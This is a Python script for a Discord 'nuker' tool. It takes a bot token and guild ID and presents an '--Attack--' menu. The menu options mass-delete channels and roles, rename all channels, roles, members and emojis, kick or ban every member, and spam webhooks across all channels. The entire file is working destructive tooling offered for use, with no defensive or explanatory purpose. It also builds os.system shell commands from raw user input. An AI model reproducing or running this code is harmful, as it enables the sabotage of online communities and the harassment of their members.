#scripted by zufinho (again)
#now becomming more faster and more organized
import os
import time
from pystyle import Colorate,Colors
import time
import requests
banner="""

███████╗██╗░░░██╗███████╗██╗███╗░░██╗██╗░░██╗░█████╗░  ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
╚════██║██║░░░██║██╔════╝██║████╗░██║██║░░██║██╔══██╗  ████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
░░███╔═╝██║░░░██║█████╗░░██║██╔██╗██║███████║██║░░██║  ██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
██╔══╝░░██║░░░██║██╔══╝░░██║██║╚████║██╔══██║██║░░██║  ██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
███████╗╚██████╔╝██║░░░░░██║██║░╚███║██║░░██║╚█████╔╝  ██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
╚══════╝░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝░╚════╝░  ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝

██╗░░░██╗██████╗░
██║░░░██║╚════██╗
╚██╗░██╔╝░░███╔═╝
░╚████╔╝░██╔══╝░░
░░╚██╔╝░░███████╗
░░░╚═╝░░░╚══════╝
"""
version="beta 2.1 - v2"
def printcolor(text):
    print(Colorate.Horizontal(Colors.purple_to_blue,text,1))
#count sucess and fail
def countsucessfail():
    with open("result.log","r") as file:
            success=0
            ratelimited=0
            noperm=0
            fail=0
            for line in file:
                status_code = int(line.strip())
                if status_code == 201 or status_code==200 or status_code==204:
                            success += 1
                elif status_code == 429:
                    ratelimited += 1
                elif status_code == 403:
                    noperm += 1
                else:
                    fail +=1
            file.close()
            printcolor(f"{success} Requests with success")
            printcolor(f"{ratelimited} Rate limited")
            printcolor(f"{fail} Failed")
            open("result.log","w").write("")
            time.sleep(1.5)
#varivbles importants
guildverified=0
cango=0
count=0
while True:
    os.system("cls")
    printcolor(banner)
    print()
    print()
    printcolor(version)
    print()
    printcolor("Digit the token bot:")
    token=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
    #verify if bot token is valid
    tokenverify = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": f"Bot {token}"})
    if tokenverify.status_code==200:
        while True:
            os.system("cls")
            printcolor(banner)
            print()
            print()
            printcolor(version)
            print()
            printcolor("Digit the guild id:")
            guildid=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
            #verify if bot in guild
            guildverify=requests.get("https://discord.com/api/v9/users/@me/guilds", headers={"Authorization": f"Bot {token}"})
            for guild in guildverify.json():
                if guild['id']==guildid:
                    guildverified=1
                    break
            else:
                printcolor("Bot not is in guild")
                time.sleep(3)
            if guildverified==1:
                break
    else:
        printcolor("insert a valid token")
        time.sleep(3)
    if guildverified==1:
        break
#all ok

#the funcionally nuker 
while True:
    count=0
    success=0
    fail=0
    repeat=""
    new=""
    new1=""
    api=""
    cango=""
    os.system("cls")
    printcolor(banner)
    print()
    print()
    printcolor(version)
    print()
    printcolor("--Attack--")
    printcolor("[1] Create Channels         [2] Delete Channels         [3] Create Roles        [4] Delete Roles")
    printcolor("[5] Rename Channels         [6] Rename Roles            [7] Rename User         [8] Rename Emojis")
    printcolor("[9] Kick all                [10] Ban all                [11] Unban all          [12] Webhook Spammer")
    print()
    cmd=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
    if cmd=="1":
        #create channels
        printcolor("Name of channel:")
        new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
        printcolor("Channel type:")
        printcolor("text/voice/category")
        new1=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
        if new1.lower()=="text" or new1=="":
            new1=0
            cango=1
        elif new1.lower()=="voice":
            new1=2
            cango=1
        elif new1.lower()=="category":
            new1=4
            cango=1
        else:
            print(Colorate.Color(Colors.red,"type of channel incorrect",1))
            time.sleep(3)
        #creating
        if cango==1:
            printcolor("Amount of channels:")
            repeat=int(input(Colorate.Horizontal(Colors.purple_to_blue,">",1)))
            while not count==repeat:
                os.system(f"start src/createchannel.pyw {guildid} {token} {new1} {new}")
                printcolor(f"requested to create {new}")
                count=count+1
            printcolor("Finished")
            time.sleep(1.5)
            countsucessfail()
    elif cmd=="2":
        #delete channels
        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"})
        if api.status_code == 200:
            for channel in api.json():
                printcolor(f"requested to delete {channel['name']}")
                os.system(f"start src/deletechannel.pyw {token} {channel['id']}")
        else:
            print(Colorate.Color(Colors.red,f"Failed, error code {api.status_code}",1))
        printcolor("Finished")
        time.sleep(1.5)
        countsucessfail()
    elif cmd=="3":
        #role create
        printcolor("Name of role:")
        new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
        printcolor("Amount of roles:")
        repeat=int(input(Colorate.Horizontal(Colors.purple_to_blue,">",1)))
        while not count==repeat:
            os.system(f"start src/createrole.pyw {guildid} {token} {new}")
            printcolor(f"requested to create {new}")
            count=count+1
        printcolor("Finished")
        time.sleep(1.5)
        countsucessfail()
    elif cmd=="4":
        #role delete
        api=requests.get(f"https://discord.com/api/v9/guilds/{guildid}/roles",headers={"Authorization": f"Bot {token}"})
        if api.status_code==200:
            for role in api.json():
                os.system(f"start src/deleteroles.pyw {guildid} {token} {role['id']}")
                printcolor(f"requested to delete {role['name']}")
                time.sleep(0.55)
        else:
            print(Colorate.Color(Colors.red,f"Failed, error code {api.status_code}",1))
        printcolor("Finished")
        time.sleep(1.5)
        countsucessfail()
    elif cmd=="5":
        #rename channel
        printcolor("New Name:")
        new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"})
        if api.status_code==200:
            for channel in api.json():
                printcolor(f"requested channel {channel['name']} rename to {new}")
                os.system(f"start src/renamechannels.pyw {channel['id']} {token} {new}")
        else:
            print(Colorate.Color(Colors.red,f"Failed, error code {api.status_code}",1))
        printcolor("Finished")
        time.sleep(1.5)
        countsucessfail()
    elif cmd=="6":
        #rename role
        printcolor("New Name:")
        new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"})
        if api.status_code==200:
            for role in api.json():
                printcolor(f"requested role {role['name']} rename to {new}")
                os.system(f'start src/renameroles.pyw {guildid} {token} {role['id']} "{new}"')
        else:
            print(Colorate.Color(Colors.red,f"Failed, error code {api.status_code}",1))
        printcolor("Finished")
        time.sleep(1.5)
        countsucessfail()
    elif cmd=="7":
        #nick name change
        printcolor("New name:")
        new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members?limit=1000", headers={"Authorization": f"Bot {token}"})
        if api.status_code==200:
            for people in api.json():
                printcolor(f'requested user {people['user']['username']} rename to {new}')
                os.system(f'start src/changenickname.pyw {guildid} {token} {people['user']['id']} "{new}"')
        else:
            print(Colorate.Color(Colors.red,f"Failed, error code {api.status_code}",1))
        printcolor("Finished")
        time.sleep(1.5)
        countsucessfail()
    elif cmd=="8":
        #emoji name change
        printcolor("New name:")
        new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/emojis", headers={"Authorization": f"Bot {token}"})
        if api.status_code==200:
            for emoji in api.json():
                printcolor(f"requested change {emoji['name']} rename to {new}")
                os.system(f"start src/renameemojis.pyw {guildid} {token} {emoji['id']} {new}")
        else:
            print(Colorate.Color(Colors.red,f"Failed, error code {api.status_code}",1))
        printcolor("Finished")
        time.sleep(1.5)
        countsucessfail()
    elif cmd=="9":
        #kick all
        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members?limit=1000", headers={"Authorization": f"Bot {token}"})
        if api.status_code==200:
            for people in api.json():
                printcolor(f"requested to kick user {people['user']['username']}")
                os.system(f"start src/kickmember.pyw {guildid} {token} {people['user']['id']}")
        else:
            print(Colorate.Color(Colors.red,f"Failed, error code {api.status_code}",1))
        printcolor("Finished")
        time.sleep(1.5)
        countsucessfail()
    elif cmd=="10":
        #ban all
        printcolor("Ban reason:")
        new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members?limit=1000", headers={"Authorization": f"Bot {token}"})
        if api.status_code==200:
            for people in api.json():
                printcolor(f"requested to ban user {people['user']['username']}")
                os.system(f"start src/banmember.pyw {guildid} {token} {people['user']['id']} {new}")
        else:
            print(Colorate.Color(Colors.red,f"Failed, error code {api.status_code}",1))
        printcolor("Finished")
        time.sleep(1.5)
        countsucessfail()
    elif cmd=="11":
        #unban all
        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/bans", headers={"Authorization": f"Bot {token}"})
        if api.status_code==200:
            for people in api.json():
                printcolor(f"requested to unban user {people['user']['username']}")
                os.system(f"start src/unbanmember.pyw {guildid} {token} {people['user']['id']}")
        else:
            print(Colorate.Color(Colors.red,f"Failed, error code {api.status_code}",1))
        printcolor("Finished")
        time.sleep(1.5)
        countsucessfail()
    elif cmd=="12":
        #webhook spammer
        printcolor("Message Content:")
        new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
        printcolor("Repeat how many times:")
        new1=int(input(Colorate.Horizontal(Colors.purple_to_blue,">",1)))
        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"})
        if api.status_code==200:
            for channel in api.json():
                os.system(f'start src/webhookcreate.pyw {token} {channel['id']} "{new}" {new1}')
                printcolor(f"Requested to create and send webhook at {channel['name']}")
        else:
            print(Colorate.Color(Colors.red,f"Failed, error code {api.status_code}",1))
        time.sleep(2)
        countsucessfail()